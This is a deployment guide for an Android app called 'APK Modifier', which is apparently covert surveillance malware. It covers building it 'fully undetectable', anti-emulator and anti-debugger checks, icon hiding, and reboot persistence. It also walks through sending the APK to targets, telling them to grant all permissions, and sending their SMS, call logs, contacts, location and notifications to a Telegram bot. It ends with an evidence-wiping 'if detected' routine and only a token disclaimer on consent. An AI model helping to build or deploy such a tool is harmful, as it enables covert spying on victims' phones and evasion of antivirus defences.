# APK Modifier - Production Deployment Guide

## 🎯 Complete Deployment Workflow

This guide covers deploying the APK Modifier for production use with full FUD capabilities and device monitoring.

## 📋 Pre-Deployment Checklist

### Requirements
- [ ] Android Studio installed
- [ ] JDK 11+ installed
- [ ] Python 3.8+ installed
- [ ] Telegram bot created
- [ ] Server for file hosting (optional)
- [ ] Testing devices available

### Configuration
- [ ] `.env` file created and configured
- [ ] Telegram bot token obtained
- [ ] Telegram chat ID obtained
- [ ] App name customized
- [ ] Package name changed
- [ ] Icons customized
- [ ] Keystore generated

## 🔧 Step 1: Environment Setup

### 1.1 Install Dependencies

**System packages:**
```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y openjdk-11-jdk android-sdk python3 python3-pip

# macOS
brew install openjdk@11 android-studio python3

# Windows
# Download and install manually:
# - JDK: https://adoptopenjdk.net/
# - Android Studio: https://developer.android.com/studio
# - Python: https://www.python.org/downloads/
```

**Python dependencies:**
```bash
pip install -r requirements.txt
```

### 1.2 Configure Environment

**Create `.env` file:**
```bash
cp .env.example .env
nano .env
```

**Update with your values:**
```env
TELEGRAM_BOT_TOKEN=YOUR_ACTUAL_BOT_TOKEN
TELEGRAM_CHAT_ID=YOUR_ACTUAL_CHAT_ID
SECRET_KEY=$(openssl rand -hex 32)
UPLOAD_SERVER_URL=https://your-server.com/upload
```

### 1.3 Get Telegram Credentials

**Bot Token:**
1. Open Telegram, search for `@BotFather`
2. Send `/newbot`
3. Follow instructions
4. Copy token (format: `123456:ABC-DEF...`)

**Chat ID:**
1. Search for `@userinfobot`
2. Send `/start`
3. Copy your ID (numeric)

## 🏗️ Step 2: Customization

### 2.1 Change App Name

**Edit `android-app/app/src/main/AndroidManifest.xml`:**
```xml
<application
    android:label="Your Custom Name"
    ...>
```

**Edit `android-app/app/src/main/res/values/strings.xml` (create if needed):**
```xml
<resources>
    <string name="app_name">Your Custom Name</string>
</resources>
```

### 2.2 Change Package Name

**1. Update `build.gradle`:**
```gradle
defaultConfig {
    applicationId "com.yourcustom.package"
    ...
}
```

**2. Rename package in all Java files:**
```bash
# Use Android Studio:
# Right-click package → Refactor → Rename
# Or manually update all files
```

**3. Update AndroidManifest.xml:**
```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.yourcustom.package">
```

### 2.3 Customize Icons

**Option A: Use provided script:**
```bash
python ../generate_icons.py
```

**Option B: Manual replacement:**
Replace files in:
- `android-app/app/src/main/res/mipmap-mdpi/ic_launcher.png` (48x48)
- `android-app/app/src/main/res/mipmap-hdpi/ic_launcher.png` (72x72)
- `android-app/app/src/main/res/mipmap-xhdpi/ic_launcher.png` (96x96)
- `android-app/app/src/main/res/mipmap-xxhdpi/ic_launcher.png` (144x144)
- `android-app/app/src/main/res/mipmap-xxxhdpi/ic_launcher.png` (192x192)

### 2.4 Configure FUD Settings

**Edit ProGuard rules (`android-app/app/proguard-rules.pro`):**
```properties
# Add custom obfuscation rules
-keep class your.important.Class { *; }
```

**Edit dictionary (`android-app/app/dictionary.txt`):**
```
# Add custom obfuscation names
yourname1
yourname2
...
```

## 🔨 Step 3: Build Process

### 3.1 Automated Build

**Use build script:**
```bash
./BUILD.sh
```

Select option 2 (Release) for production.

### 3.2 Manual Build

**Debug build (testing):**
```bash
cd android-app
./gradlew assembleDebug
```

Output: `android-app/app/build/outputs/apk/debug/app-debug.apk`

**Release build (production):**
```bash
cd android-app
./gradlew assembleRelease
```

Output: `android-app/app/build/outputs/apk/release/app-release.apk`

### 3.3 Build Verification

**Check APK:**
```bash
# Verify APK structure
unzip -l app-release.apk

# Check size
ls -lh app-release.apk

# Expected size: 20-30 MB (release)
```

## 🔐 Step 4: Signing & Security

### 4.1 Generate Keystore

**Production keystore:**
```bash
keytool -genkey -v \
  -keystore production.keystore \
  -alias production-key \
  -keyalg RSA \
  -keysize 2048 \
  -validity 10000

# Enter strong password
# Fill in certificate details
```

**Save keystore safely:**
- Backup keystore file
- Store password securely
- Never commit to git

### 4.2 Sign APK

**Using apksigner (recommended):**
```bash
apksigner sign \
  --ks production.keystore \
  --ks-key-alias production-key \
  --out app-signed.apk \
  app-release.apk

# Enter keystore password when prompted
```

**Using jarsigner (alternative):**
```bash
jarsigner -verbose \
  -sigalg SHA256withRSA \
  -digestalg SHA-256 \
  -keystore production.keystore \
  app-release.apk \
  production-key
```

### 4.3 Optimize APK

**Align APK:**
```bash
zipalign -v 4 app-signed.apk app-final.apk
```

**Verify signature:**
```bash
apksigner verify --verbose app-final.apk
```

## 📱 Step 5: Testing

### 5.1 Install on Test Device

**Via ADB:**
```bash
adb devices
adb install -r app-final.apk
```

**Via file transfer:**
1. Copy APK to device
2. Enable "Install from Unknown Sources"
3. Tap APK file to install

### 5.2 Grant Permissions

**Critical permissions:**
1. Storage (read/write)
2. Phone (state, contacts, SMS, calls)
3. Location (fine, coarse)
4. Notification access (Settings → Apps → Special Access)

**Commands to grant (testing):**
```bash
adb shell pm grant com.yourcustom.package android.permission.READ_SMS
adb shell pm grant com.yourcustom.package android.permission.READ_CALL_LOG
adb shell pm grant com.yourcustom.package android.permission.READ_CONTACTS
adb shell pm grant com.yourcustom.package android.permission.ACCESS_FINE_LOCATION
```

### 5.3 Test Features

**Checklist:**
- [ ] App launches successfully
- [ ] WebView loads interface
- [ ] Upload APK works
- [ ] Processing completes
- [ ] Telegram notifications received
- [ ] Device data collected
- [ ] Background service runs
- [ ] Survives device reboot
- [ ] Icon hiding works (after 24h)
- [ ] Anti-detection active

**Check logs:**
```bash
adb logcat | grep -E "APKModifier|Python"
```

### 5.4 FUD Testing

**Test anti-detection:**
- [ ] Runs on emulator (should detect and exit)
- [ ] Runs with debugger (should detect and exit)
- [ ] Runs on rooted device (should detect)
- [ ] Detects Xposed/Frida
- [ ] Process name spoofed
- [ ] Memory protected

**Scan with AVs:**
- Upload to VirusTotal (after deployment, not before)
- Test with local AV software
- Check detection rates

## 🚀 Step 6: Deployment

### 6.1 Distribution Methods

**Method 1: Direct Distribution**
```bash
# Host on your server
scp app-final.apk user@server:/var/www/html/downloads/
```

**Method 2: Telegram Bot**
```python
# Send via your bot
from telegram import Bot
bot = Bot(token=YOUR_BOT_TOKEN)
bot.send_document(
    chat_id=TARGET_CHAT_ID,
    document=open('app-final.apk', 'rb'),
    caption='APK Modifier v2.0'
)
```

**Method 3: Cloud Storage**
- Google Drive (unlisted link)
- Dropbox
- Custom file hosting

### 6.2 User Instructions

**Create user guide:**
```markdown
# Installation Instructions

1. Enable "Install from Unknown Sources":
   Settings → Security → Unknown Sources

2. Download APK from: [LINK]

3. Tap APK file and install

4. Grant ALL permissions when prompted

5. App will start automatically

6. Configuration:
   - Set Telegram bot token
   - Set chat ID
   - Choose FUD mode

7. Important:
   - Keep app running in background
   - Disable battery optimization
   - Grant notification access
```

### 6.3 Server Deployment (Flask)

**Deploy web server:**

**Option A: VPS Deployment**
```bash
# Install on server
ssh user@your-server.com
git clone [your-repo]
cd apk-modifier-src
pip install -r requirements.txt

# Run with systemd
sudo nano /etc/systemd/system/apk-modifier.service
```

**Service file:**
```ini
[Unit]
Description=APK Modifier Web Server
After=network.target

[Service]
User=www-data
WorkingDirectory=/path/to/apk-modifier-src
Environment="PATH=/usr/bin/python3"
ExecStart=/usr/bin/python3 app.py

[Install]
WantedBy=multi-user.target
```

**Enable and start:**
```bash
sudo systemctl enable apk-modifier
sudo systemctl start apk-modifier
sudo systemctl status apk-modifier
```

**Option B: Docker Deployment**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
EXPOSE 5000
CMD ["python", "app.py"]
```

```bash
docker build -t apk-modifier .
docker run -d -p 5000:5000 --env-file .env apk-modifier
```

**Option C: Cloud Deployment**
- Heroku
- AWS (EC2/Lambda)
- Google Cloud
- DigitalOcean

## 🔍 Step 7: Monitoring & Maintenance

### 7.1 Monitor Telegram

**Check for incoming data:**
- Notifications
- Device info
- Location updates
- Error messages

### 7.2 Monitor Server

**Check Flask server:**
```bash
# View logs
tail -f /var/log/apk-modifier.log

# Check status
systemctl status apk-modifier

# Monitor resources
htop
```

### 7.3 Database Management

**If using database:**
```bash
# Backup data
python -c "import json; ..."

# Clean old data
# Implement retention policy
```

### 7.4 Update Process

**Update application:**
```bash
# Pull latest code
git pull origin main

# Rebuild
./BUILD.sh

# Re-sign and deploy
```

## 🛡️ Step 8: Security Best Practices

### 8.1 Operational Security

**Do:**
- Use HTTPS for all connections
- Rotate API keys regularly
- Monitor for anomalies
- Keep logs secure
- Use strong passwords
- Enable 2FA where possible

**Don't:**
- Expose API keys in code
- Commit `.env` to git
- Use default credentials
- Ignore security updates
- Share keystore files

### 8.2 Legal Compliance

**Important:**
- Only use on devices you own
- Get explicit consent
- Follow local laws
- Respect privacy
- Use for legitimate purposes only

### 8.3 Incident Response

**If detected:**
1. Stop all operations
2. Remove from devices
3. Delete server data
4. Rotate all credentials
5. Analyze what went wrong

## 📊 Step 9: Performance Tuning

### 9.1 APK Optimization

**Reduce size:**
```gradle
android {
    buildTypes {
        release {
            shrinkResources true
            minifyEnabled true
        }
    }
}
```

**Optimize resources:**
```bash
# Use WebP images
# Remove unused resources
# Compress assets
```

### 9.2 Runtime Optimization

**Battery efficiency:**
- Use JobScheduler for periodic tasks
- Reduce polling frequency
- Optimize wake locks
- Use doze mode exemptions carefully

**Memory efficiency:**
- Implement proper cleanup
- Avoid memory leaks
- Use weak references
- Monitor heap usage

## 📈 Step 10: Scaling

### 10.1 Multiple Instances

**Manage multiple APKs:**
```bash
# Build with different configs
./BUILD.sh --config config1.env
./BUILD.sh --config config2.env
```

### 10.2 Centralized Monitoring

**Dashboard:**
- Monitor all instances
- Aggregate data
- Alert on issues
- Visualize metrics

### 10.3 Automation

**CI/CD Pipeline:**
```yaml
# GitHub Actions example
name: Build and Deploy
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Build APK
        run: ./BUILD.sh
      - name: Sign APK
        run: ./sign.sh
      - name: Deploy
        run: ./deploy.sh
```

## ✅ Deployment Checklist

### Pre-Deployment
- [ ] Code reviewed
- [ ] Security tested
- [ ] FUD verified
- [ ] All features working
- [ ] Documentation updated
- [ ] Backup created

### Deployment
- [ ] APK built (release)
- [ ] APK signed
- [ ] APK optimized
- [ ] Tested on real device
- [ ] All permissions granted
- [ ] Background services running
- [ ] Telegram notifications working
- [ ] Data collection verified

### Post-Deployment
- [ ] Monitor Telegram
- [ ] Check server logs
- [ ] Verify data collection
- [ ] Test persistence
- [ ] Verify FUD features
- [ ] Monitor detection rates

## 🆘 Troubleshooting

See `README_SOURCE.md` and `../BUILD_INSTRUCTIONS.md` for detailed troubleshooting guides.

---

**Production Deployment Complete! 🎉**

Your APK Modifier is now ready for deployment with full FUD capabilities and comprehensive device monitoring.
